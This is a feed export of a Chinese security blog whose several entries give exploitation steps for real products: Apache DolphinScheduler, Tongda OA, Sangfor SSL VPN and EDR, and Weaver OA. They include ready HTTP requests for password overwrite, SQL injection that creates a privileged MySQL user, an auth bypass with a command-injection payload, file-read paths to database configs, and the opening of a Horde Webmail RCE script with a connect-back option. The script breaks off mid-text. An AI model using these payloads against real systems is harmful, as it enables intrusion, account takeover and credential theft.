src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917171000453.png" alt="image-20200917171000453"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;dolphinscheduler&#x2F;datasources&#x2F;connect HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">type&#x3D;MYSQL&amp;name&#x3D;test&amp;note&#x3D;&amp;host&#x3D;127.0.0.1&amp;port&#x3D;3306&amp;database&#x3D;test&amp;</span><br><span class="line">principal&#x3D;&amp;userName&#x3D;root&amp;password&#x3D;root&amp;connectType&#x3D;&amp;</span><br><span class="line">other&#x3D;&#123;&quot;detectCustomCollations&quot;:true,&quot;autoDeserialize&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>关于MySQL JDBC客户端反序列化漏洞的相关参考：</p><p><a href="https://www.anquanke.com/post/id/203086">https://www.anquanke.com/post/id/203086</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Apache-DolphinScheduler组件介绍&quot;&gt;&lt;a href=&quot;#Apache-DolphinScheduler组件介绍&quot; class=&quot;headerlink&quot; title=&quot;Apache DolphinScheduler组件介绍&quot;&gt;&lt;/a&gt;Apach
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Apache" scheme="http://www.ol4three.com/tags/Apache/"/>
    
  </entry>
  
  <entry>
    <title>Apache DolphinScheduler权限覆盖漏洞(CVE-2020-13922)</title>
    <link href="http://www.ol4three.com/2020/09/17/WEB/Exploit/Apache-DolphinScheduler%E6%9D%83%E9%99%90%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-CVE-2020-13922/"/>
    <id>http://www.ol4three.com/2020/09/17/WEB/Exploit/Apache-DolphinScheduler%E6%9D%83%E9%99%90%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-CVE-2020-13922/</id>
    <published>2020-09-17T08:56:23.000Z</published>
    <updated>2020-12-01T12:14:10.360Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>发现的漏洞是任何租户下的普通用户都可以通过以下方式覆盖其他用户的密码<br>api interface /dolphinscheduler/users/update</p><h2 id="受影响的版本"><a href="#受影响的版本" class="headerlink" title="受影响的版本"></a>受影响的版本</h2><p>受影响版本<br>Apache DolphinScheduler = 1.2.0、1.2.1、1.3.1</p><p>安全版本<br>Apache DolphinScheduler &gt;= 1.3.2</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917165719031.png" alt="image-20200917165719031"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;dolphinscheduler&#x2F;users&#x2F;update</span><br><span class="line">userName&#x3D;admin&amp;userPassword&#x3D;Password1!&amp;tenantId&#x3D;1&amp;email&#x3D;sdluser%40sdluser.sdluser&amp;phone&#x3D;&amp;id&#x3D;1</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917170117506.png" alt="image-20200917170117506"></p><h2 id="漏洞修复方案"><a href="#漏洞修复方案" class="headerlink" title="漏洞修复方案"></a>漏洞修复方案</h2><p>建议用户将 Apache DolphinScheduler 升级到安全版本。</p><p>下载链接：<a href="https://dolphinscheduler.apache.org/zh-cn/docs/release/download.html">https://dolphinscheduler.apache.org/zh-cn/docs/release/download.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;漏洞描述&lt;/h2&gt;&lt;p&gt;发现的漏洞是任何租户下的普通用户都可以通过以下方式覆盖其他用户的密码&lt;br&gt;api interface /dolphinsc
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Apache" scheme="http://www.ol4three.com/tags/Apache/"/>
    
  </entry>
  
  <entry>
    <title>通达OA v11.7 后台SQL注入</title>
    <link href="http://www.ol4three.com/2020/09/17/WEB/Exploit/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA-v11-7-%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://www.ol4three.com/2020/09/17/WEB/Exploit/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA-v11-7-%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/</id>
    <published>2020-09-17T08:42:22.000Z</published>
    <updated>2020-12-01T16:23:55.423Z</updated>
    
    <content type="html"><![CDATA[<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>需要登录权限</p><p>原文作者给出了利用链注入加mysql权限，又是写木马的。用起来很舒服</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;general&#x2F;hr&#x2F;manage&#x2F;query&#x2F;delete_cascade.php?condition_cascade&#x3D;select%20if((substr(user(),1,1)&#x3D;%27r%27),1,power(9999,99))</span><br></pre></td></tr></table></figure><p>1、添加一个mysql用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grant all privileges ON mysql.* TO &#39;ateam666&#39;@&#39;%&#39; IDENTIFIED BY &#39;abcABC@123&#39; WITH GRANT OPTION</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917165121752.png" alt="image-20200917165121752"></p><p>2、给创建的ateam666账户添加mysql权限。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE &#96;mysql&#96;.&#96;user&#96; SET &#96;Password&#96; &#x3D; &#39;*DE0742FA79F6754E99FDB9C8D2911226A5A9051D&#39;, &#96;Select_priv&#96; &#x3D; &#39;Y&#39;, &#96;Insert_priv&#96; &#x3D; &#39;Y&#39;, &#96;Update_priv&#96; &#x3D; &#39;Y&#39;, &#96;Delete_priv&#96; &#x3D; &#39;Y&#39;, &#96;Create_priv&#96; &#x3D; &#39;Y&#39;, &#96;Drop_priv&#96; &#x3D; &#39;Y&#39;, &#96;Reload_priv&#96; &#x3D; &#39;Y&#39;, &#96;Shutdown_priv&#96; &#x3D; &#39;Y&#39;, &#96;Process_priv&#96; &#x3D; &#39;Y&#39;, &#96;File_priv&#96; &#x3D; &#39;Y&#39;, &#96;Grant_priv&#96; &#x3D; &#39;Y&#39;, &#96;References_priv&#96; &#x3D; &#39;Y&#39;, &#96;Index_priv&#96; &#x3D; &#39;Y&#39;, &#96;Alter_priv&#96; &#x3D; &#39;Y&#39;, &#96;Show_db_priv&#96; &#x3D; &#39;Y&#39;, &#96;Super_priv&#96; &#x3D; &#39;Y&#39;, &#96;Create_tmp_table_priv&#96; &#x3D; &#39;Y&#39;, &#96;Lock_tables_priv&#96; &#x3D; &#39;Y&#39;, &#96;Execute_priv&#96; &#x3D; &#39;Y&#39;, &#96;Repl_slave_priv&#96; &#x3D; &#39;Y&#39;, &#96;Repl_client_priv&#96; &#x3D; &#39;Y&#39;, &#96;Create_view_priv&#96; &#x3D; &#39;Y&#39;, &#96;Show_view_priv&#96; &#x3D; &#39;Y&#39;, &#96;Create_routine_priv&#96; &#x3D; &#39;Y&#39;, &#96;Alter_routine_priv&#96; &#x3D; &#39;Y&#39;, &#96;Create_user_priv&#96; &#x3D; &#39;Y&#39;, &#96;Event_priv&#96; &#x3D; &#39;Y&#39;, &#96;Trigger_priv&#96; &#x3D; &#39;Y&#39;, &#96;Create_tablespace_priv&#96; &#x3D; &#39;Y&#39;, &#96;ssl_type&#96; &#x3D; &#39;&#39;, &#96;ssl_cipher&#96; &#x3D; &#39;&#39;, &#96;x509_issuer&#96; &#x3D; &#39;&#39;, &#96;x509_subject&#96; &#x3D; &#39;&#39;, &#96;max_questions&#96; &#x3D; 0, &#96;max_updates&#96; &#x3D; 0, &#96;max_connections&#96; &#x3D; 0, &#96;max_user_connections&#96; &#x3D; 0, &#96;plugin&#96; &#x3D; &#39;mysql_native_password&#39;, &#96;authentication_string&#96; &#x3D; &#39;&#39;, &#96;password_expired&#96; &#x3D; &#39;Y&#39; WHERE &#96;Host&#96; &#x3D; Cast(&#39;%&#39; AS Binary(1)) AND &#96;User&#96; &#x3D; Cast(&#39;ateam666&#39; AS Binary(5));</span><br></pre></td></tr></table></figure><p>3、刷新数据库就可以登录到数据库啦。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;general&#x2F;hr&#x2F;manage&#x2F;query&#x2F;delete_cascade.php?condition_cascade&#x3D;flush privileges;</span><br></pre></td></tr></table></figure><p>4、通达OA配置mysql默认是不开启外网访问的所以需要修改mysql授权登录。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;general&#x2F;hr&#x2F;manage&#x2F;query&#x2F;delete_cascade.php?condition_cascade&#x3D;</span><br><span class="line"></span><br><span class="line">grant all privileges ON mysql.* TO &#39;ateam666&#39;@&#39;%&#39; IDENTIFIED BY &#39;abcABC@123&#39; WITH GRANT OPTION</span><br></pre></td></tr></table></figure><p>5、接下来就是考验mysql提权功底的时候啦 </p><p>参考链接：<a href="https://mp.weixin.qq.com/s/8rvIT1y_odN2obJ1yAvLbw">https://mp.weixin.qq.com/s/8rvIT1y_odN2obJ1yAvLbw</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;利用条件&quot;&gt;&lt;a href=&quot;#利用条件&quot; class=&quot;headerlink&quot; title=&quot;利用条件&quot;&gt;&lt;/a&gt;利用条件&lt;/h2&gt;&lt;p&gt;需要登录权限&lt;/p&gt;
&lt;p&gt;原文作者给出了利用链注入加mysql权限，又是写木马的。用起来很舒服&lt;/p&gt;
&lt;figure c
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="通达OA" scheme="http://www.ol4three.com/tags/%E9%80%9A%E8%BE%BEOA/"/>
    
  </entry>
  
  <entry>
    <title>深信服 SSL VPN - Pre Auth 修改绑定手机</title>
    <link href="http://www.ol4three.com/2020/09/17/WEB/Exploit/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D-SSL-VPN-Pre-Auth-%E4%BF%AE%E6%94%B9%E7%BB%91%E5%AE%9A%E6%89%8B%E6%9C%BA/"/>
    <id>http://www.ol4three.com/2020/09/17/WEB/Exploit/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D-SSL-VPN-Pre-Auth-%E4%BF%AE%E6%94%B9%E7%BB%91%E5%AE%9A%E6%89%8B%E6%9C%BA/</id>
    <published>2020-09-17T07:59:22.000Z</published>
    <updated>2020-12-01T16:25:37.407Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞起因："><a href="#漏洞起因：" class="headerlink" title="漏洞起因："></a>漏洞起因：</h2><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917160030652.png" alt="image-20200917160030652"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>老版本(M7.6.1)代码放上，看不懂的直接看 POC 吧；新版本的没绕成功还在审，所以不确定是不是这个</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917160439482.png" alt="image-20200917160439482"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917160456180.png" alt="image-20200917160456180"></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://&lt;path&gt;/por/changetelnum.csp?apiversion=1</span><br><span class="line"></span><br><span class="line">newtel=TARGET_PHONE&amp;sessReq=clusterd&amp;username=TARGET_USERNAME&amp;grpid=0&amp;sessid=0&amp;ip=127.0.0.1</span><br></pre></td></tr></table></figure><h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917160603185.png" alt="image-20200917160603185"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;漏洞起因：&quot;&gt;&lt;a href=&quot;#漏洞起因：&quot; class=&quot;headerlink&quot; title=&quot;漏洞起因：&quot;&gt;&lt;/a&gt;漏洞起因：&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://oss-map.oss-cn-beijing.aliyuncs.com/img/
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="sangfor" scheme="http://www.ol4three.com/tags/sangfor/"/>
    
      <category term="VPN" scheme="http://www.ol4three.com/tags/VPN/"/>
    
  </entry>
  
  <entry>
    <title>深信服EDR3.2.21 任意代码执行漏洞分析</title>
    <link href="http://www.ol4three.com/2020/09/17/WEB/Exploit/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR3-2-21-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://www.ol4three.com/2020/09/17/WEB/Exploit/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR3-2-21-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2020-09-17T07:38:47.000Z</published>
    <updated>2020-12-01T16:25:56.722Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917154417360.png" alt="image-20200917154417360"></p><p>dev_linkage_launch.php 为设备联动的新入口点主要是将联动的接口构造成业务统一处理的接口</p><h3 id="主要调用"><a href="#主要调用" class="headerlink" title="主要调用"></a>主要调用</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917154552300.png" alt="image-20200917154552300"></p><p>跟进</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917154605381.png" alt="image-20200917154605381"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">可以看到 第一个检查为  req_url&#x3D;_SERVER[&#39;PHP_SELF&#39;];</span><br><span class="line"></span><br><span class="line">绕过第一个检查:</span><br><span class="line"></span><br><span class="line">在他们系统nginx配置文件里面:</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917154713639.png" alt="image-20200917154713639"></p><p><strong>通过</strong>nginx规则可以得知,他们没有设置禁止外网访问.从而可以直接访问</p><p>/api/edr/sangforinter/v2/xxx 绕过 第一个检查</p><h3 id="第二检查-权限检查"><a href="#第二检查-权限检查" class="headerlink" title="第二检查**:** 权限检查"></a><strong>第二检查**</strong>:** <strong>权限检查</strong></h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917155137057.png" alt="image-20200917155137057">跟进check_access_token</p><p> <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/1062563-20200911105704599-1994739155.png" alt="img"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这里if(md5_str&#x3D;&#x3D;json_token[&quot;md5&quot;]) 引发第二个漏洞: php弱类型导致的漏洞</span><br><span class="line"></span><br><span class="line">绕过只需要传入一个base64编码的json内容为 &#123;“md5”:true&#125;即可</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>至此**</strong>权限检查绕过完毕**</p><p><strong>来到</strong> process_cssp.php 文件</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917155330169.png" alt="image-20200917155330169"></p><p>存在任意指令执行漏洞.作者试图使用escapeshellarg函数去给单引号打反斜杠实际上是毫无作用的.</p><p>绕过:{“params”:”w=123&quot;‘1234123’&quot;|命令”}</p><h2 id="结果如下"><a href="#结果如下" class="headerlink" title="结果如下"></a>结果如下</h2><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917155504277.png" alt="image-20200917155504277"></p><p>返回：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917155558597.png" alt="image-20200917155558597"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://oss-map.oss-cn-beijing.aliyuncs.com/img/imag
      
    
    </summary>
    
    
      <category term="WEB" scheme="http://www.ol4three.com/categories/WEB/"/>
    
    
      <category term="sangfor" scheme="http://www.ol4three.com/tags/sangfor/"/>
    
      <category term="EDR" scheme="http://www.ol4three.com/tags/EDR/"/>
    
  </entry>
  
  <entry>
    <title>通达OA任意用户登陆</title>
    <link href="http://www.ol4three.com/2020/09/15/WEB/Exploit/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86/"/>
    <id>http://www.ol4three.com/2020/09/15/WEB/Exploit/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86/</id>
    <published>2020-09-15T01:49:58.000Z</published>
    <updated>2020-12-01T16:24:10.339Z</updated>
    
    <content type="html"><![CDATA[<p>1、首先访问 /ispirit/login_code.php 获取 codeuid。</p><p>2、访问 /general/login_code_scan.php 提交 post 参数：</p><p>uid=1&amp;codeuid={9E908086-342B-2A87-B0E9-E573E226302A}</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200915095052094.png" alt="image-20200915095052094"></p><p>然后构造数据包请求/logincheck_code.php 得到cookie</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200915095153086.png" alt="image-20200915095153086"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;1、首先访问 /ispirit/login_code.php 获取 codeuid。&lt;/p&gt;
&lt;p&gt;2、访问 /general/login_code_scan.php 提交 post 参数：&lt;/p&gt;
&lt;p&gt;uid=1&amp;amp;codeuid={9E908086-342B-2
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="通达OA" scheme="http://www.ol4three.com/tags/%E9%80%9A%E8%BE%BEOA/"/>
    
  </entry>
  
  <entry>
    <title>泛微OA云桥任意文件读取和目录遍历漏洞</title>
    <link href="http://www.ol4three.com/2020/09/14/WEB/Exploit/%E6%B3%9B%E5%BE%AEOA%E4%BA%91%E6%A1%A5%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%92%8C%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"/>
    <id>http://www.ol4three.com/2020/09/14/WEB/Exploit/%E6%B3%9B%E5%BE%AEOA%E4%BA%91%E6%A1%A5%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%92%8C%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-09-14T07:05:22.000Z</published>
    <updated>2020-12-01T12:10:48.219Z</updated>
    
    <content type="html"><![CDATA[<p>未授权任意文件读取,/wxjsapi/saveYZJFile接口获取filepath,输入文件路径-&gt;读取文件内容。返回数据包内出现了程序的绝对路径,攻击者可以通过返回内容识别程序运行路径从而下载数据库配置文件危害可见。</p><p>1、 downloadUrl参数修改成需要获取文件的绝对路径,记录返回包中的id值。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200914150710482.png" alt="image-20200914150710482"></p><p>2、通过查看文件接口访问 /file/fileNoLogin/id</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200914150728248.png" alt="image-20200914150728248"></p><p>想到一个新的思路，能够在漏洞利用过程中找到更多有用的信息。</p><p>1、简单说说昨天泛微云桥的报告,输入文件路径-&gt;读取文件内容,我们读了一下代码后发现这还能读取文件目录。</p><p>2、参数不填写绝对路径写进文本内容就是当前的目录,产生了一个新的漏洞 “目录遍历”</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200914150903715.png" alt="image-20200914150903715"></p><p>3、目录遍历+文件读取,我们能做的事情就很多了,比如读取管理员在桌面留下的密码文件、数据库配置文件、nginx代理配置、访问日志、D盘迅雷下载。</p><p>d://ebridge//tomcat//webapps//ROOT//WEB-INF//classes//init.properties</p><p>d:/OA/tomcat8/webapps/OAMS/WEB-INF/classes/dbconfig.properties 泛微OA数据库</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200914150946564.png" alt="image-20200914150946564"></p><p>修复建议:</p><p>关闭程序路由 /file/fileNoLogin</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;未授权任意文件读取,/wxjsapi/saveYZJFile接口获取filepath,输入文件路径-&amp;gt;读取文件内容。返回数据包内出现了程序的绝对路径,攻击者可以通过返回内容识别程序运行路径从而下载数据库配置文件危害可见。&lt;/p&gt;
&lt;p&gt;1、 downloadUrl参数
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="泛微OA" scheme="http://www.ol4three.com/tags/%E6%B3%9B%E5%BE%AEOA/"/>
    
  </entry>
  
  <entry>
    <title>Horde Groupware Webmail Edition 远程命令执行</title>
    <link href="http://www.ol4three.com/2020/09/14/WEB/Exploit/Horde-Groupware-Webmail-Edition-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>http://www.ol4three.com/2020/09/14/WEB/Exploit/Horde-Groupware-Webmail-Edition-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
    <published>2020-09-14T07:01:58.000Z</published>
    <updated>2020-09-14T07:03:45.339Z</updated>
    
    <content type="html"><![CDATA[<p>Python Exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Horde Groupware Webmail Edition Sort sortpref Deserialization of Untrusted Data Remote Code Execution Vulnerability</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Identifiers: ZDI-CAN-10436 / ZDI-20-1051</span></span><br><span class="line"><span class="string">Found by ..: mr_me</span></span><br><span class="line"><span class="string">Tested on .: Horde Groupware Webmail 5.2.22 (pear installation) on Debian 9 Stretch w/ Apache/2.4.25 &amp; PHP 7.0.33</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Summary:</span></span><br><span class="line"><span class="string">========</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">It&#x27;s possible to reach a deserialization of untrusted data vulnerability within the constructor of the IMP_Prefs_Sort class. A low privileged authenticated attacker can leverage this to achieve remote code execution.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Example:</span></span><br><span class="line"><span class="string">========</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">saturn:~ mr_me$ ./poc.py </span></span><br><span class="line"><span class="string">(+) usage ./poc.py &lt;target&gt; &lt;path&gt; &lt;user:pass&gt; &lt;connectback:port&gt;</span></span><br><span class="line"><span class="string">(+) eg: ./poc.py 172.16.175.148 /horde/ hordeuser:pass123 172.16.175.1:1337</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">saturn:~ mr_me$ ./poc.py 